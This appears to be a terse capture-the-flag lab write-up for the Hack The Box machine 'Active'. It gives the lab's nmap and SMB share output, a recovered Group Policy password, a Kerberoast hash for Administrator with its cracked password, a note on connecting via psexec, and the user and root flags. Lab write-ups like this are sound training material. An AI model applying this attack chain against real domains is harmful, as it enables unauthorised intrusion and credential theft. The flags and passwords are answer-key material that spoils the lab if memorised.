# Box: Active

> IP:10.10.10.100

damiano gubiani

---

> OS: windows machine


nmap output

```bash
53/tcp    open  domain        syn-ack ttl 127 Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid:
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-05-11 20:41:35Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
49152/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49153/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49154/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49155/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49157/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49165/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
```

---

smb shares

```bash
SMB         10.10.10.100    445    DC               Share           Permissions     Remark
SMB         10.10.10.100    445    DC               -----           -----------     ------
SMB         10.10.10.100    445    DC               ADMIN$                          Remote Admin
SMB         10.10.10.100    445    DC               C$                              Default share
SMB         10.10.10.100    445    DC               IPC$                            Remote IPC
SMB         10.10.10.100    445    DC               NETLOGON                        Logon server share
SMB         10.10.10.100    445    DC               Replication     READ
SMB         10.10.10.100    445    DC               SYSVOL                          Logon server share
SMB         10.10.10.100    445    DC               Users

```

---

GPpassword

[ * ] Password: GPPstillStandingStrong2k18

---

found admin ticket

$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$e3935c60a9443597baf93a51883795d4$be331185e14a3626a9227f860ae5ce5761304d9bf487397df69979787520364f56d1a73b815c34c991cd27c0fbf4e30e28c5e22926df0623dffbed3a9e1a0150a1d2cf8bd3fadae04f4303e8f092ddfc2caaea9e0d9a43575a2f63e13b0110cac4c9a91b2ea4bc5e2ad8787e037bda1e629be20c5d29a356813e5d20d730e8df646364f430462235a8e83310450362ea8a0f13534371008f9c53a6ef3a9ca84978227cb9f68c965b586b3d9660bc1d67f66ee0e6069d9a6825eb90394f2b30c2e1a2e1e1ed6d9486770689de299ecace09502765472501d94bfd6e39342e6608f88d53ef8831899b5b45f1992786a9b237d208b5f19d93934ce82d1bf03c3471d6cb947266866d68864de889df911edf0b08ad93d477ffb67a68247b6b8cc660b4f0378243b6919617063ae6a44f5446fe293b8280ec419caf341e6939e008942359711bb4fc15cb69cbccb9365c14b7adf889915ac7d677457aeccb0d7603bfe514f08ba8d40d0aca88fe49d50db77bea5b44ea37ae3cdd50f70ccebe71ddc0c2823a1e430cd0c66c563386cc9fc66b9d507b8224aae1dd57632292f21e653090105ab063b2707793acea712704b1b17e2f3bd9be9ce76a33c4e3c8c88d474907b5e40fde8d81b92fbaf2e7fcba9e84a3fe335be060d30060006ec6e22d734b54e21d34688fe1fbdb4060141c7644c4f3a9d967efba255f6002360cd897e7a867775e51451955e7d8185b4fbf8358a2800326ac4a5d0626ec74a2a3f1cb42cc8f0f9741a732ec17bdd7a6a6d6e554dc8294eed576abe050a9c3d86d67f25f294543cd7a5c01b9456aadd0a801dd2dfeea49563147b90e2511444b7d473814b965546ba53585c6b17641aaa812502dd8514f9649f7b502cfe0730ef2f80dae19a811a0fbce632e7e18849b4e2b27a5ae892541bc685bb961400b9615aff42c99fe1c43a3c718f8abc66232614174fdd2c79a2e2557c05b4780b4775918b9752ae148977081938493b0ac72078ce12ef47174ae271389f97b076c18e6340c7196e12063c637c39823510cb21f754ce84a0614e81a90a5afc7e7691dcb13f8d22f96ca60a153c82a4a090c48219e2712975e33b86363c3a1f949cb6af18336a5c146fc063993693db4cc1880eca147a258653f112b92dd02508663512410aa9b73cf011111b26500ad2e13e655efcc7f021d64dc331fc5598f1a43ef7d198ee9cb2ce9d1a15e0015ea975c8af0f2a8a5bd5ee34fdfd582bbabf717:Ticketmaster1968

conecting via psexec 

---

root flag
00b415ff49182dd9d19f37e669d5bc18


local flag
d705ea75a4d7d8c13e2e9b449dff1cb6






